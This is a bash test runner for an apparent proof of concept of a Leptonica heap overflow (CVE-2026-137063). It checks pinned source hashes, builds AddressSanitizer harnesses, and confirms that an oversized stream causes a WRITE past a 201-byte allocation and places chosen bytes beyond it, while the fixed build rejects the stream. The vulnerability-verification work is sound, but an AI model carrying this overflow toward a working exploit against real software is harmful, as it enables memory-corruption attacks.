#!/usr/bin/env bash
# Leptonica CVE-2026-137063 staged proof runner. All inputs are local; the
# oversized stream is a sparse file mapped read-only, never resident as 1 GB.
set -u
cd "$(dirname "$0")"
mkdir -p harness/out
CFLAGS="-O0 -g -fno-omit-frame-pointer -Iharness -Ipins"
VP='-DCREATE_INC="create-parent.inc" -DSTREAM_INC="stream-parent.inc"'
FP='-DCREATE_INC="create-fixed.inc" -DSTREAM_INC="stream-fixed.inc"'
PASS=0; FAIL=0
ok() { printf 'PASS %s\n' "$1"; PASS=$((PASS+1)); }
bad() { printf 'FAIL %s\n' "$1"; FAIL=$((FAIL+1)); }
hc() { # FILE EXPECTED LABEL
  got=$(sha256sum "$1" | cut -d' ' -f1)
  if [ "$got" = "$2" ]; then ok "$3"; else bad "$3 (got $got)"; fi
}

echo '== pinned bytes'
hc pins/bytearray-1.87.0.c b5740bbd65a5a7d18fa60220138411a5cc72ad838045e86d015889d835eccbc7 'vulnerable bytearray.c'
hc pins/bytearray-fixed.c e37f74fd680a917bc5c37a9b54d51e6ab242dd26fea6c30017e88c1b50e96e65 'fixed bytearray.c'
hc pins/consts.inc 25bd8f0a16b28e694ea55ea473fbe099858b42ab29e3db5ea6ac322d8d2462d9 'verbatim size constants'
hc pins/create-parent.inc 571570525a8cbb69488c1a3a31b0390a25f11fa9f0e357eac558f30105bbb685 'verbatim l_byteaCreate parent'
hc pins/stream-parent.inc 5ed99ee58e3aac5be7906668a7266c9c60e880846d9b62123b1a7843c0dad32b 'verbatim l_byteaInitFromStream parent'
hc pins/create-fixed.inc a66cebd7340cecb55950175418ef0b4c353485e74b2b28becb0778f10d0f7a6f 'verbatim l_byteaCreate fixed'
hc pins/stream-fixed.inc b05ae0baca694553e4b4657fdfeb8f69bb0f356f3e160c5d2b2cbe0dac168eaf 'verbatim l_byteaInitFromStream fix'

echo '== builds'
gcc $CFLAGS $VP -fsanitize=address -o harness/out/vuln-asan  harness/driver.c || exit 2
gcc $CFLAGS $FP -fsanitize=address -o harness/out/fixed-asan harness/driver.c || exit 2
gcc $CFLAGS $VP -DBOUNDED -o harness/out/vuln-plain  harness/driver.c || exit 2
gcc $CFLAGS $FP -DBOUNDED -o harness/out/fixed-plain harness/driver.c || exit 2
if command -v clang >/dev/null 2>&1; then
  clang $CFLAGS $VP -fsanitize=address -o harness/out/vuln-clang-asan harness/driver.c || exit 2
fi
ok 'gcc+clang builds'

echo '== rung 3: ASan heap WRITE past the clamped 201-byte allocation'
A=$(harness/out/vuln-asan 2>&1); RC=$?
printf '%s\n' "$A" > harness/out/vuln-asan.out
case "$A" in
  *'heap-buffer-overflow'*'WRITE of size 1000000001'*'0 bytes after 201-byte region'*) ok 'gcc ASan WRITE-1000000001 exact allocation';;
  *) bad "gcc ASan attack (rc=$RC)";;
esac
case "$A" in
  *'stream-parent.inc:17'*|*'l_byteaInitFromStream'*) ok 'gcc ASan stack in pinned l_byteaInitFromStream';;
  *) bad 'gcc ASan pinned stack';;
esac
case "$A" in
  *'create-parent.inc:9'*) ok 'gcc ASan allocation in pinned l_byteaCreate';;
  *) bad 'gcc ASan pinned allocation';;
esac
if [ -x harness/out/vuln-clang-asan ]; then
  C=$(harness/out/vuln-clang-asan 2>&1)
  printf '%s\n' "$C" > harness/out/vuln-clang-asan.out
  case "$C" in
    *'heap-buffer-overflow'*'WRITE of size 1000000001'*) ok 'clang ASan WRITE-1000000001';;
    *) bad 'clang ASan attack';;
  esac
fi

echo '== fixed and safe-input controls'
F=$(harness/out/fixed-asan 2>&1); RC=$?
printf '%s\n' "$F" > harness/out/fixed-asan.out
case "$F" in
  *AddressSanitizer*) bad 'fixed ASan attack must be clean';;
  *'stream too large'*) [ "$RC" -eq 0 ] && ok 'fixed rejects oversized stream' || bad "fixed rc=$RC";;
  *) bad 'fixed did not report stream too large';;
esac
case "$F" in
  *'BA=NULL'*) ok 'fixed returns no bytea';;
  *) bad 'fixed bytea result';;
esac
S=$(LPTN_N=16 harness/out/vuln-asan 2>&1); RC=$?
case "$S" in
  *AddressSanitizer*) bad 'vulnerable safe input ASan';;
  *'NALLOC=17 SIZE=16'*) [ "$RC" -eq 0 ] && ok 'vulnerable safe 16-byte stream clean' || bad "safe rc=$RC";;
  *) bad 'vulnerable safe stream shape';;
esac

echo '== rung 4 PARTIAL: synthetic bounded consumer observes chosen bytes'
P=$(harness/out/vuln-plain 2>&1); RC=$?
printf '%s\n' "$P" > harness/out/vuln-plain.out
AFTER=$(printf '%s\n' "$P" | sed -n 's/^PAST_ALLOC=//p')
if [ "$RC" -eq 0 ] && [ "${AFTER#4d495348452d4c4550544f4e494341}" != "$AFTER" ]; then
  ok "chosen MISHE-LEPTONICA past allocation ($AFTER)"
else
  bad "chosen bytes (rc=$RC after=$AFTER)"
fi
Q=$(harness/out/fixed-plain 2>&1); RC=$?
case "$Q" in
  *'PAST_ALLOC='*) bad 'fixed plain wrote past allocation';;
  *'BA=NULL'*) [ "$RC" -eq 0 ] && ok 'fixed plain rejects oversized stream' || bad "fixed plain rc=$RC";;
  *) bad 'fixed plain result';;
esac

printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
